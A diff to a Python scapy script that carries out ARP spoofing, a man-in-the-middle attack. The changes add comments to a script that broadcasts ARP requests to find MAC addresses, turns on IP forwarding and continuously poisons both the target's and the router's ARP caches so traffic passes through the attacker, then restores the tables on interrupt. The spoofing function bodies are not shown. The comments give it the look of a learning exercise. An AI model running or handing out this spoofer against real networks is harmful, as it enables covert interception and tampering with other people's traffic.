@@ -9,9 +9,9 @@ import sys
 
 def scan(ip):
     arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # broadcast mac address
 
-    req_broadcast = broadcast/arp_request
+    req_broadcast = broadcast/arp_request # combine the two packets
     ans_list = scapy.srp(req_broadcast, timeout=1, verbose=0)[0]
     return (ans_list[0][1].hwsrc)
 
@@ -49,10 +49,14 @@ print("Target IP:" + target_ip)
 enable_ipv4_forwarding()
 try:
     while True:
+        # Calling the spoof function
+        # Spoofing the target machine to think that we are the router
         spoof(target_ip, router_ip)
+        # Spoofing the router to think that we are the target machine
         spoof(router_ip, target_ip)
         sent_count += 2
         #for python 2.7------------------
+        # Dynamic printing of the sent number of packets
         print("\r[+] Sent packets successfully = " + str(sent_count)),
         sys.stdout.flush()
         #-----------------
@@ -62,6 +66,7 @@ try:
 except KeyboardInterrupt:
     print("\n[-] Keyboard Interrupt Detected")
     print("Quitting and Restoring...")
+    # Restoring ARP tables on target machine and router
     restore(target_ip, router_ip)
     restore(router_ip, target_ip)
 
